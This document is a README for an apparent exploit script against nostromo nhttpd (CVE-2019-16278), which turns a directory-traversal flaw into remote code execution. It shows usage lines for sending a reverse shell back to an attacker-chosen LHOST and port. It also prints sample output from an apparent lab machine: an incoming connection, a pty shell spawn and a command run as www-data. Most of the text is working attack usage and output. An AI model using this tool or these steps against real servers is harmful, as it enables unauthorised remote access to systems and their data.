# nostromo remote command execution (CVE-2019-16278)

Directory Traversal in the function http_verify in nostromo nhttpd through 1.9.6 allows an attacker to achieve remote code execution via a crafted HTTP request.

## Usage

Execute without arguments to get the usage menu.

```sh
⬢  CVE-2019-16278_nostromo_rce  master ⦿ ./nostromo_rce.py 

 ▐ ▄       .▄▄ · ▄▄▄▄▄▄▄▄        • ▌ ▄ ·.       ▄▄▄   ▄▄· ▄▄▄ .
•█▌▐█▪     ▐█ ▀. •██  ▀▄ █·▪     ·██ ▐███▪▪     ▀▄ █·▐█ ▌▪▀▄.▀·
▐█▐▐▌ ▄█▀▄ ▄▀▀▀█▄ ▐█.▪▐▀▀▄  ▄█▀▄ ▐█ ▌▐▌▐█· ▄█▀▄ ▐▀▀▄ ██ ▄▄▐▀▀▪▄
██▐█▌▐█▌.▐▌▐█▄▪▐█ ▐█▌·▐█•█▌▐█▌.▐▌██ ██▌▐█▌▐█▌.▐▌▐█•█▌▐███▌▐█▄▄▌
▀▀ █▪ ▀█▄▀▪ ▀▀▀▀  ▀▀▀ .▀  ▀ ▀█▄▀▪▀▀  █▪▀▀▀ ▀█▄▀▪.▀  ▀·▀▀▀  ▀▀▀ 
[nighter@nighter.se]
    
Usage: ./nostromo_rce.py <URL> <LHOST> <LPORT>
EXAMPLE: ./nostromo_rce.py 'http://10.10.10.70' <command>
EXAMPLE: ./nostromo_rce.py 'http://10.10.10.70' 10.10.14.24 1337
```

Add target and LHOST to get a shell on vulnerable machine. 

```sh
⬢  CVE-2019-16278_nostromo_rce  master ⦾ ./nostromo_rce.py http://10.10.XX.XX 10.10.XX.XX 9001
[+] LHOST = 10.10.XX.XX
[+] LPORT = 9001
[+] Netcat = 9001
[+] Exploit
Connection from 10.10.XX.XX:36832
python3 -c 'import pty;pty.spawn("/bin/bash")'
www-data@traverxec:/usr/bin$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```